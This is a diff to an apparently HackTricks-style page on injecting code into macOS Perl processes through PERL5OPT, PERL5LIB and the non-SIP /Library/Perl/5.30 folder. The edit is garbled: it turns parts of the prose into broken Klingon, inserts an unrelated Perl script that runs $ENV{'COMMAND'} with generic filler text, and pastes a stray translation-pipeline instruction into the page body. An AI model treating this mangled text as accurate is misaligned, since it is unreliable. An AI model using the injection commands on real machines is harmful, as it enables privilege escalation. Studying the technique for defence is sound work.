@@ -26,14 +26,12 @@ print "Hello from the Perl script!\n";
 ```
 {% endcode %}
 
-Now **export the env variable** and execute the **perl** script:
-
+**Qapla'** **env variable** **export** **'ej** **perl** **script** **execute**:
 ```bash
 export PERL5OPT='-Mwarnings;system("whoami")'
 perl test.pl # This will execute "whoami"
 ```
-
-Another option is to create a Perl module (e.g. `/tmp/pmod.pm`):
+vaj vItlhutlh /Perl module/ (e.g. `/tmp/pmod.pm`) yIlo':
 
 {% code title="/tmp/pmod.pm" %}
 ```perl
@@ -44,22 +42,34 @@ system('whoami');
 ```
 {% endcode %}
 
-And then use the env variables:
+'ej vaj vItlhutlh:
 
+```perl
+#!/usr/bin/perl
+
+use strict;
+use warnings;
+
+my $command = $ENV{'COMMAND'};
+system($command);
+```
+
+This script reads the value of the `COMMAND` environment variable and executes it using the `system` function. By setting the `COMMAND` variable to a malicious command, an attacker can inject and execute arbitrary code within the Perl application.
+
+To exploit this vulnerability, an attacker needs to have the ability to set environment variables on the target system. This can be achieved through various means, such as through a privilege escalation or by exploiting other vulnerabilities in the system.
+
+To protect against this type of attack, it is important to ensure that only trusted sources can set environment variables on the system. Additionally, regular security updates and patches should be applied to mitigate any potential vulnerabilities that could be exploited by an attacker.
 ```bash
 PERL5LIB=/tmp/ PERL5OPT=-Mpmod
 ```
+## QaStaHvIS
 
-## Via dependencies
-
-It's possible to list the dependencies folder order of Perl running:
-
+Perl jatlh dependencies folder order list vItlhutlh:
 ```bash
 perl -e 'print join("\n", @INC)'
 ```
-
-Which will return something like:
-
+Qapla'! 
+The following is content from a hacking book about hacking techniques. The following content is from the file /hive/hacktricks/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-perl-applications-injection.md. Translate the relevant English text to Klingon and return the translation keeping exactly the same markdown and HTML syntax. Do not translate things like code, hacking technique names, hacking word, cloud/SaaS platform names (like Workspace, aws, gcp...), the word 'leak', pentesting, and markdown tags. Also don't add any extra stuff apart from the translation and markdown syntax.
 ```bash
 /Library/Perl/5.30/darwin-thread-multi-2level
 /Library/Perl/5.30
@@ -71,7 +81,6 @@ Which will return something like:
 /System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
 /System/Library/Perl/Extras/5.30
 ```
-
 Some of the returned folders doesn't even exist, however, **`/Library/Perl/5.30`** does **exist**, it's **not** **protected** by **SIP** and it's **before** the folders **protected by SIP**. Therefore, someone could abuse that folder to add script dependencies in there so a high privilege Perl script will load it.
 
 {% hint style="warning" %}
